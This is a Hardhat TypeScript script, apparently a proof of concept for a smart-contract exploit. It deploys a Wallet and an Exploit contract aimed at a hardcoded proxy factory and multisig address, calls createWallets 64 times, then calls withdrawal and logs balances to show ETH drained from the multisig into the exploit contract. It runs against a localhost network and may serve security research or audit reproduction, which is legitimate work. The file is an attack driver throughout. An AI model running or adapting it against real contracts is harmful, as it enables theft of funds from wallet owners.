import hre from "hardhat";
require("dotenv").config();

const proxyFactory = "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b";
const multisigAddr = "0x4f3a120E72C76c22ae802D129F599BFDbc31cb81";

// npx hardhat run scripts\exploit.s.ts --network localhost
async function main() {
  const Wallet = await hre.ethers.getContractFactory("Wallet");
  const wallet = await Wallet.deploy();
  console.log(`Wallet deployed to ${wallet.target}`);

  const Exploit = await hre.ethers.getContractFactory("Exploit");
  const exploit = await Exploit.deploy(
    proxyFactory,
    wallet.target,
    multisigAddr
  );
  console.log(`Exploit deployed to ${exploit.target}`);

  const exploitBalanceBefore = await hre.ethers.provider.getBalance(
    exploit.target
  );
  const multisigBalanceBefore = await hre.ethers.provider.getBalance(
    multisigAddr
  );
  console.log(
    "Exploit balance before",
    hre.ethers.formatEther(exploitBalanceBefore),
    "ETH"
  );
  console.log(
    "Multisig balance before",
    hre.ethers.formatEther(multisigBalanceBefore),
    "ETH"
  );

  for (let i = 0; i < 64; i++) {
    console.log(`Executing transaction ${i + 1}...`);
    const txResponse = await exploit.createWallets();
    await txResponse.wait();
  }

  const txResponse = await exploit.withdrawal();
  await txResponse.wait();

  const exploitBalanceAfter = await hre.ethers.provider.getBalance(
    exploit.target
  );
  const multisigBalanceAfter = await hre.ethers.provider.getBalance(
    multisigAddr
  );
  console.log(
    "Exploit balance after",
    hre.ethers.formatEther(exploitBalanceAfter),
    "ETH"
  );
  console.log(
    "Multisig balance after",
    hre.ethers.formatEther(multisigBalanceAfter),
    "ETH"
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
